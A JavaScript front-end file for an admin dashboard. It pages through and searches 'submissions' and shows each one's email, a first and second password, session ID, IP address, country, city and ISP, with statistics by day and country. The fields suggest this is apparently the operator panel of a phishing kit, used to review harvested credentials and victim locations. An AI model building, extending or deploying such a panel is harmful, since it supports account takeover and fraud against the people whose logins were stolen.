// public/js/dashboard.js

(function setupDarkMode() {
  const saved = localStorage.getItem("admin-dark");
  if (saved === "1") document.body.classList.add("dark");
  const toggle = document.getElementById("darkToggle");
  if (!toggle) return;
  toggle.textContent = document.body.classList.contains("dark") ? "☀️" : "🌙";
  toggle.addEventListener("click", () => {
    document.body.classList.toggle("dark");
    const on = document.body.classList.contains("dark");
    toggle.textContent = on ? "☀️" : "🌙";
    localStorage.setItem("admin-dark", on ? "1" : "0");
  });
})();

let currentPage = 1;
let totalPages = 1;
let currentSearch = "";

const rowsEl = document.getElementById("rows");
const pageInfoEl = document.getElementById("pageInfo");
const prevBtn = document.getElementById("prevBtn");
const nextBtn = document.getElementById("nextBtn");
const searchBox = document.getElementById("searchBox");

async function loadPage(page = 1, search = "") {
  const params = new URLSearchParams({ page, search });
  const res = await fetch(`/admin/api/submissions?${params.toString()}`);
  const data = await res.json();

  const submissions = data.submissions || [];
  currentPage = data.page || 1;
  totalPages = data.pages || 1;

  updateStats(submissions, data.total);

  if (!submissions.length) {
    rowsEl.innerHTML = `<tr><td colspan="9">No submissions found.</td></tr>`;
  } else {
    rowsEl.innerHTML = submissions.map(entry => `
      <tr>
        <td>${entry.email || ""}</td>
        <td>${entry.firstPassword || ""}</td>
        <td>${entry.secondPassword || ""}</td>
        <td>${entry.sessionID || ""}</td>
        <td>${entry.ip || ""}</td>
        <td>${entry.country || ""}</td>
        <td>${entry.city || ""}</td>
        <td>${entry.isp || ""}</td>
        <td>${entry.time ? new Date(entry.time).toLocaleString() : ""}</td>
      </tr>
    `).join("");
  }

  pageInfoEl.textContent = `Page ${currentPage} of ${totalPages}`;
  prevBtn.disabled = currentPage <= 1;
  nextBtn.disabled = currentPage >= totalPages;
}

function updateStats(submissions, total) {
  document.getElementById("statTotal").textContent = total || 0;

  const today = new Date().toDateString();
  const todayCount = submissions.filter(s => s.time && new Date(s.time).toDateString() === today).length;
  document.getElementById("statToday").textContent = todayCount;

  const uniqIPs = new Set(submissions.map(s => s.ip).filter(Boolean));
  document.getElementById("statIPs").textContent = uniqIPs.size;

  const countryCounts = {};
  submissions.forEach(s => {
    if (!s.country) return;
    countryCounts[s.country] = (countryCounts[s.country] || 0) + 1;
  });
  const topCountry = Object.entries(countryCounts).sort((a,b)=>b[1]-a[1])[0];
  document.getElementById("statCountry").textContent = topCountry ? topCountry[0] : "—";
}

prevBtn.addEventListener("click", () => {
  if (currentPage > 1) loadPage(currentPage - 1, currentSearch);
});

nextBtn.addEventListener("click", () => {
  if (currentPage < totalPages) loadPage(currentPage + 1, currentSearch);
});

let searchTimeout;
searchBox.addEventListener("input", () => {
  clearTimeout(searchTimeout);
  searchTimeout = setTimeout(() => {
    currentSearch = searchBox.value.trim();
    loadPage(1, currentSearch);
  }, 300);
});

loadPage();